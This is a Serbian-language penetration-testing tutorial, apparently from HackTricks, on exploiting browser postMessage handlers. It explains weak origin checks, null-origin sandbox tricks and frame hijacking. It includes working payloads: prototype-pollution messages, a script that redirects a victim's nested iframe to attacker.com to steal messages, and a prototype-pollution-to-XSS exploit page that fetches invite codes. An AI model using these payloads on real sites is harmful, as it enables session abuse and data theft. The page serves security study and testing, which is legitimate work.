# PostMessage Vulnerabilities

## PostMessage ranjivosti

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Pošalji **PostMessage**

**PostMessage** koristi sledeću funkciju za slanje poruke:

```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```

Napomena da **targetOrigin** može biti '\*' ili URL kao što je _https://company.com._\
U **drugom scenariju**, **poruka se može poslati samo na tu domenu** (čak i ako je poreklo objekta prozora drugačije).\
Ako se koristi **zvezdica**, **poruke mogu biti poslate na bilo koju domenu**, i biće poslate na poreklo objekta prozora.

### Napad na iframe i zvezdicu u **targetOrigin**

Kao što je objašnjeno u [**ovom izveštaju**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/), ako pronađete stranicu koja može biti **iframed** (bez zaštite `X-Frame-Header`) i koja šalje **osetljive** poruke putem **postMessage** koristeći **zvezdicu** (\*), možete **izmeniti** **poreklo** **iframe-a** i **procuriti** **osetljivu** poruku na domen koji kontrolišete.\
Napomena da ako se stranica može iframovati, ali je **targetOrigin postavljen na URL, a ne na zvezdicu**, ovaj **tri**k neće funkcionisati.

```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```

## Iskorišćavanje funkcije addEventListener

**`addEventListener`** je funkcija koju JS koristi za deklarisanje funkcije koja očekuje **`postMessages`**.\
Koristiće se sličan kod kao što je prikazan ispod:

```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```

U ovom slučaju, **prva stvar** koju kod radi je **provera porekla**. Ovo je izuzetno **važno**, posebno ako stranica treba da izvrši **nešto osetljivo** sa primljenim informacijama (kao što je promena lozinke). **Ako ne proverava poreklo, napadači mogu naterati žrtve da šalju proizvoljne podatke na ove endpointe** i promeniti lozinke žrtava (u ovom primeru).

### Enumeracija

Da biste **pronašli slušače događaja** na trenutnoj stranici, možete:

* **Pretražite** JS kod za `window.addEventListener` i `$(window).on` (_JQuery verzija_)
* **Izvršite** u konzoli alata za razvoj: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* **Idite na** _Elements --> Event Listeners_ u alatima za razvoj pregledača

![](<../../.gitbook/assets/image (617).png>)

* Koristite **dodatak za pregledač** kao što je [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ili [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Ovi dodaci za pregledač će **presresti sve poruke** i prikazati ih vama.

### Bypass provere porekla

* Atribut **`event.isTrusted`** se smatra sigurnim jer vraća `True` samo za događaje koji su generisani od strane stvarnih korisničkih akcija. Iako je izazovno zaobići ga ako je pravilno implementiran, njegov značaj u sigurnosnim proverama je primetan.
* Upotreba **`indexOf()`** za proveru porekla u PostMessage događajima može biti podložna zaobilaženju. Primer koji ilustruje ovu ranjivost je:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```

* Metoda **`search()`** iz `String.prototype.search()` je namenjena za regularne izraze, a ne za stringove. Prosleđivanje bilo čega osim regularnog izraza dovodi do implicitne konverzije u regex, čime se metoda potencijalno čini nesigurnom. To je zato što u regex-u tačka (.) deluje kao džoker, omogućavajući zaobilaženje provere sa posebno oblikovanim domenima. Na primer:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

* Funkcija **`match()`**, slično kao `search()`, obrađuje regex. Ako je regex nepravilno struktuiran, može biti podložan zaobilaženju.
* Funkcija **`escapeHtml`** je namenjena za sanitizaciju unosa putem izbegavanja karaktera. Međutim, ona ne stvara novi objekat sa izbegnutim karakterima, već prebrisuje postojeće osobine objekta. Ovo ponašanje može biti iskorišćeno. Konkretno, ako se objekat može manipulisati tako da njegova kontrolisana osobina ne priznaje `hasOwnProperty`, `escapeHtml` neće raditi kako se očekuje. Ovo je prikazano u sledećim primerima:
* Očekivani neuspeh:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```

* Zaobilaženje izbegavanja:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

U kontekstu ove ranjivosti, objekat `File` je posebno podložan iskorišćavanju zbog svoje samo-čitajuće osobine `name`. Ova osobina, kada se koristi u šablonima, nije sanitizovana funkcijom `escapeHtml`, što može dovesti do potencijalnih sigurnosnih rizika.

* Svojstvo `document.domain` u JavaScript-u može biti postavljeno od strane skripte kako bi se skratila domena, što omogućava opušteniju primenu politike istog porekla unutar iste nadređene domene.

### Bypass e.origin == window.origin

Prilikom ugrađivanja veb stranice unutar **sandbox iframe-a** koristeći %%%%%%, važno je razumeti da će poreklo iframe-a biti postavljeno na null. Ovo je posebno važno kada se radi sa **sandbox atributima** i njihovim implikacijama na sigurnost i funkcionalnost.

Navođenjem **`allow-popups`** u sandbox atributu, svaki popup prozor otvoren iz iframe-a nasleđuje sandbox ograničenja svojih roditelja. To znači da osim ako se takođe ne uključi atribut **`allow-popups-to-escape-sandbox`**, poreklo popup prozora takođe biva postavljeno na `null`, usklađujući se sa poreklom iframe-a.

Kao rezultat toga, kada se otvori popup u ovim uslovima i poruka se pošalje iz iframe-a u popup koristeći **`postMessage`**, i pošiljalac i primalac imaju postavljeno poreklo na `null`. Ova situacija dovodi do scenarija u kojem se **`e.origin == window.origin`** procenjuje kao tačno (`null == null`), jer i iframe i popup dele istu vrednost porekla `null`.

Za više informacija **pročitajte**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Zaobilaženje e.source

Moguće je proveriti da li je poruka poslata sa istog prozora u kojem skripta sluša (posebno zanimljivo za **Content Scripts iz pregledačkih dodataka** kako bi se proverilo da li je poruka poslata sa iste stranice):

```javascript
// If it’s not, return immediately.
if( received_message.source !== window ) {
return;
}
```

Možete prisiliti **`e.source`** poruke da bude null tako što ćete kreirati **iframe** koji **šalje** **postMessage** i odmah se **briše**.

Za više informacija **pročitajte:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### Bypassovanje X-Frame-Header-a

Da biste izveli ove napade, idealno bi bilo da **ubacite veb stranicu žrtve** unutar `iframe`-a. Međutim, neki zaglavlji poput `X-Frame-Header` mogu **sprečiti** takvo **ponašanje**.\
U tim scenarijima i dalje možete koristiti manje prikriven napad. Možete otvoriti novi tab ka ranjivoj veb aplikaciji i komunicirati s njom:

```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```

### Krađa poruke poslate detetu blokiranjem glavne stranice

Na sledećoj stranici možete videti kako možete ukrasti **osetljive podatke poslate putem postmessage** do deteta u iframe-u **blokiranjem** glavne stranice pre slanja podataka i zloupotrebom **XSS-a u detetu** da bi **procurili podaci** pre nego što budu primljeni:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### Krađa poruke modifikovanjem lokacije iframe-a

Ako možete da uključite veb stranicu u iframe bez X-Frame-Header-a koja sadrži drugi iframe, možete **promeniti lokaciju tog detetovog iframe-a**, tako da ako prima **postmessage** poslat koristeći **zvezdicu**, napadač može **promeniti** poreklo tog iframe-a na stranicu **kojom on upravlja** i **ukrasti** poruku:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessage do Prototype Pollution i/ili XSS

U scenarijima gde se podaci poslati putem `postMessage` izvršavaju pomoću JS-a, možete **ubaciti** stranicu u **iframe** i **iskoristiti** **prototype pollution/XSS** slanjem eksploatacije putem `postMessage`.

Par **veoma dobro objašnjenih XSS-a putem `postMessage`** može se naći na [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)

Primer eksploatacije za zloupotrebu **Prototype Pollution, a zatim XSS-a** putem `postMessage` do `iframe-a`:

```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```

Za **više informacija**:

* Link do stranice o [**zagađenju prototipa**](../deserialization/nodejs-proto-prototype-pollution/)
* Link do stranice o [**XSS**](../xss-cross-site-scripting/)
* Link do stranice o [**zagađenju prototipa na klijentskoj strani do XSS-a**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## Reference

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* Za vežbanje: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
